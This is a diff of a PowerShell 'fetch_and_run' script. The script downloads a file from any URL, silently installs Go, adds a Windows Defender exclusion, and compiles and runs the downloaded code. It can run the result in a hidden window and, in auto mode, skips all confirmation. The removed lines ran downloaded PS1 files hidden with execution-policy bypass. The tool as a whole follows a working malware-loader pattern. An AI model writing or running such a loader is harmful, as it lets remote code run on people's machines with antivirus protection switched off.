@@ -2,7 +2,7 @@
 fetch_and_run.ps1
 - Downloads a given URL to a local folder
 - Optionally installs Go silently to a system-wide location and adds to PATH (requires admin)
-- Runs or extracts the downloaded artifact appropriately
+- Runs or extracts the downloaded artifact appropriately, with special handling for Go files without extensions
 - Adds a Defender exclusion for the file/folder optionally (requires admin)
 - Logs actions to %TEMP%\download_runner.log
 
@@ -53,16 +53,15 @@ function Test-IsAdmin {
 function Download-File($sourceUrl, $outPath) {
     Log "Downloading $sourceUrl -> $outPath"
     try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "fetch_and_run/1.0")
-        $wc.DownloadFile($sourceUrl, $outPath)
+        $ProgressPreference = 'SilentlyContinue'
+        Invoke-WebRequest -Uri $sourceUrl -OutFile $outPath -UseBasicParsing -ErrorAction Stop
         Log "Downloaded successfully"
         return $true
     } catch {
         Log "Download failed: $_"
         return $false
     } finally {
-        if ($wc) { $wc.Dispose() }
+        $ProgressPreference = 'Continue'
     }
 }
 
@@ -122,39 +121,64 @@ function Add-ToSystemPath($path) {
 function Install-GoSilent {
     if (-not (Test-IsAdmin)) {
         Log "Install-GoSilent: admin required but not admin. Aborting Go install."
+        Write-Host "Error: Run this script as Administrator to install Go."
         return $false
     }
-    $goVersion = "1.23.2" # Latest stable version as of Sep 2025
+    $goVersion = "1.23.2"
     $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
     $msiName = "go$goVersion.windows-$arch.msi"
     $msiUrl = "https://go.dev/dl/$msiName"
     $msiPath = Join-Path $DestFolder $msiName
     $goInstallDir = "C:\Program Files\Go"
 
-    # Check if Go is already installed
     $goBin = Join-Path $goInstallDir "bin\go.exe"
     if (Test-Path $goBin) {
         Log "Go already installed at $goInstallDir"
+        Write-Host "Go is already installed."
         return $true
     }
 
-    Log "Downloading Go MSI $msiUrl"
-    if (-not (Download-File $msiUrl $msiPath)) { Log "Go MSI download failed"; return $false }
+    Log "Downloading Go MSI $msiUrl to $msiPath"
+    Write-Host "Downloading Go $goVersion... (this may take 30-60 seconds)"
+    try {
+        $ProgressPreference = 'SilentlyContinue'
+        Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -UseBasicParsing -ErrorAction Stop
+        Log "Downloaded Go MSI successfully"
+    } catch {
+        Log "Go MSI download failed: $_"
+        Write-Host "Download failed. Check log at $LogFile"
+        return $false
+    } finally {
+        $ProgressPreference = 'Continue'
+    }
 
-    Log "Starting silent install of Go via msiexec to $goInstallDir (may prompt UAC)"
+    if (-not (Test-Path $msiPath)) {
+        Log "Go MSI not found at $msiPath"
+        Write-Host "Error: Go MSI not downloaded."
+        return $false
+    }
+
+    Log "Starting silent install of Go via msiexec to $goInstallDir"
+    Write-Host "Installing Go to $goInstallDir... (please approve any UAC prompt)"
     $args = "/i `"$msiPath`" /qn /norestart INSTALLDIR=`"$goInstallDir`""
-    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru
-    if ($proc.ExitCode -eq 0) {
-        Log "Go installed successfully to $goInstallDir"
-        # Add Go to system PATH
-        $goBinPath = Join-Path $goInstallDir "bin"
-        Add-ToSystemPath $goBinPath | Out-Null
-        # Set GOROOT environment variable
-        [Environment]::SetEnvironmentVariable("GOROOT", $goInstallDir, [System.EnvironmentVariableTarget]::Machine)
-        Log "GOROOT set to $goInstallDir"
-        return $true
-    } else {
-        Log "Go msiexec returned exit code $($proc.ExitCode)"
+    try {
+        $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru -ErrorAction Stop
+        if ($proc.ExitCode -eq 0) {
+            Log "Go installed successfully to $goInstallDir"
+            Write-Host "Go installation complete."
+            $goBinPath = Join-Path $goInstallDir "bin"
+            Add-ToSystemPath $goBinPath | Out-Null
+            [Environment]::SetEnvironmentVariable("GOROOT", $goInstallDir, [System.EnvironmentVariableTarget]::Machine)
+            Log "GOROOT set to $goInstallDir"
+            return $true
+        } else {
+            Log "Go msiexec returned exit code $($proc.ExitCode)"
+            Write-Host "Go installation failed with exit code $($proc.ExitCode). Check log at $LogFile"
+            return $false
+        }
+    } catch {
+        Log "msiexec failed: $_"
+        Write-Host "Error during Go installation: $_"
         return $false
     }
 }
@@ -167,18 +191,28 @@ function Run-GoProgram($goFilePath) {
         Log "Go not found in PATH. Attempting to install Go."
         if (-not (Install-GoSilent)) {
             Log "Failed to install Go. Cannot compile Go program."
+            Write-Host "Error: Go installation failed. Check log at $LogFile"
             return $false
         }
     }
     $exePath = [System.IO.Path]::ChangeExtension($goFilePath, ".exe")
     Log "Compiling Go program: $goFilePath -> $exePath"
-    $proc = Start-Process -FilePath $goExe -ArgumentList "build","-o",$exePath,$goFilePath -Wait -PassThru -NoNewWindow
-    if ($proc.ExitCode -eq 0) {
-        Log "Compilation successful. Running $exePath"
-        Run-Exe -path $exePath -hidden:$RunHidden
-        return $true
-    } else {
-        Log "Go build failed with exit code $($proc.ExitCode)"
+    Write-Host "Compiling Go program (may take 10-60 seconds due to dependency downloads)..."
+    try {
+        $proc = Start-Process -FilePath $goExe -ArgumentList "build","-o",$exePath,$goFilePath -Wait -PassThru -NoNewWindow -ErrorAction Stop
+        if ($proc.ExitCode -eq 0) {
+            Log "Compilation successful. Running $exePath"
+            Write-Host "Starting Go program..."
+            Run-Exe -path $exePath -hidden:$RunHidden
+            return $true
+        } else {
+            Log "Go build failed with exit code $($proc.ExitCode)"
+            Write-Host "Go compilation failed. Check log at $LogFile"
+            return $false
+        }
+    } catch {
+        Log "Go build error: $_"
+        Write-Host "Error during Go compilation: $_"
         return $false
     }
 }
@@ -197,10 +231,11 @@ if ($Url -match "github.com/.+/blob/(.+)$") {
     Log "Detected GitHub blob URL, converted to raw URL: $Url"
 }
 
-# Get filename from URL (fallback to timestamp name)
+# Get filename from URL (fallback to privatefile with .go extension)
 $uri = [System.Uri]$Url
 $fname = [System.IO.Path]::GetFileName($uri.AbsolutePath)
-if (-not $fname -or $fname.Trim() -eq "") { $fname = "privatefile_$(Get-Date -Format yyyyMMddHHmmss).go" }
+if (-not $fname -or $fname.Trim() -eq "") { $fname = "privatefile.go" }
+elseif (-not $fname.EndsWith(".go")) { $fname = "$fname.go" }
 $destPath = Join-Path $DestFolder $fname
 
 # Confirm with user unless Auto
@@ -213,6 +248,7 @@ if (-not $Auto) {
 # Download file
 if (-not (Download-File $Url $destPath)) {
     Log "Download failed. Exiting."
+    Write-Host "Error: Failed to download $Url. Check log at $LogFile"
     exit 1
 }
 
@@ -231,6 +267,7 @@ if ($InstallGo) {
 if ($AddDefenderExclusion) {
     if (-not (Test-IsAdmin)) {
         Log "Warning: adding Defender exclusion requires admin. Please re-run as admin to add exclusion."
+        Write-Host "Warning: Defender exclusion requires admin privileges."
     } else {
         Add-DefenderExclusion $DestFolder | Out-Null
     }
@@ -238,57 +275,32 @@ if ($AddDefenderExclusion) {
 
 # Act depending on file type
 $ext = [System.IO.Path]::GetExtension($destPath).ToLowerInvariant()
-switch ($ext) {
-    ".msi" {
-        Log "Detected MSI, will attempt silent install"
-        if (-not (Test-IsAdmin)) { Log "MSI install requires admin. Please re-run as Administrator."; break }
-        $args = "/i `"$destPath`" /qn /norestart"
-        Log "Running: msiexec $args"
-        $p = Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait -PassThru
-        Log "msiexec exit code: $($p.ExitCode)"
+if ($ext -eq ".go" -or $fname -eq "privatefile.go") {
+    Log "Detected Go source file: $destPath"
+    if (-not $Auto) {
+        Write-Host "Downloaded Go source file to $destPath"
+        $r = Read-Host "Compile and run the Go program now? Y/N"
+        if ($r.ToUpper() -ne "Y") { Log "Skipped running Go program"; exit 0 }
     }
-    ".exe" {
-        Log "Detected EXE. Will run executable."
-        if ($AddDefenderExclusion -and (Test-IsAdmin)) { Add-DefenderExclusion $destPath | Out-Null }
-        Run-Exe -path $destPath -hidden:$RunHidden
+    Run-GoProgram $destPath
+} else {
+    Log "Unknown extension ($ext). Assuming Go source file."
+    Write-Host "Assuming downloaded file is Go source code."
+    $goPath = [System.IO.Path]::ChangeExtension($destPath, ".go")
+    try {
+        Rename-Item -Path $destPath -NewName $goPath -Force -ErrorAction Stop
+        Log "Renamed $destPath to $goPath"
+    } catch {
+        Log "Failed to rename file to $goPath: $_"
+        Write-Host "Error: Could not rename file to $goPath"
+        exit 1
     }
-    ".zip" {
-        Log "Detected ZIP. Extracting."
-        try {
-            Expand-Archive -Path $destPath -DestinationPath $DestFolder -Force
-            Log "Extracted to $DestFolder"
-        } catch {
-            Log "ZIP extraction failed: $_"
-        }
+    if (-not $Auto) {
+        Write-Host "Renamed file to $goPath"
+        $r = Read-Host "Compile and run the Go program now? Y/N"
+        if ($r.ToUpper() -ne "Y") { Log "Skipped running Go program"; exit 0 }
     }
-    ".ps1" {
-        Log "Detected PowerShell script. Running with Bypass."
-        if (-not $Auto) { $r = Read-Host "Run the downloaded PS1 now? Y/N"; if ($r.ToUpper() -ne "Y") { Log "Skipped running PS1"; break } }
-        $cmd = "-ExecutionPolicy Bypass -NoProfile -File `"$destPath`""
-        Log "Executing: powershell.exe $cmd"
-        Start-Process -FilePath "powershell.exe" -ArgumentList $cmd -WindowStyle Hidden
-    }
-    ".go" {
-        Log "Detected Go source file."
-        if (-not $Auto) { $r = Read-Host "Compile and run the Go program now? Y/N"; if ($r.ToUpper() -ne "Y") { Log "Skipped running Go program"; break } }
-        Run-GoProgram $destPath
-    }
-    default {
-        Log "Unknown extension ($ext). Assuming Go source file."
-        if ($Auto) {
-            Log "Auto-mode: attempting to run file as Go source."
-            $goPath = [System.IO.Path]::ChangeExtension($destPath, ".go")
-            Rename-Item -Path $destPath -NewName $goPath -Force
-            Run-GoProgram $goPath
-        } else {
-            Write-Host "Downloaded file to $destPath. Assuming Go source file."
-            $goPath = [System.IO.Path]::ChangeExtension($destPath, ".go")
-            Rename-Item -Path $destPath -NewName $goPath -Force
-            $r = Read-Host "Compile and run as Go program? Y/N"
-            if ($r.ToUpper() -eq "Y") { Run-GoProgram $goPath }
-            else { Log "Skipped running Go program"; }
-        }
-    }
+    Run-GoProgram $goPath
 }
 
 Log "fetch_and_run finished."
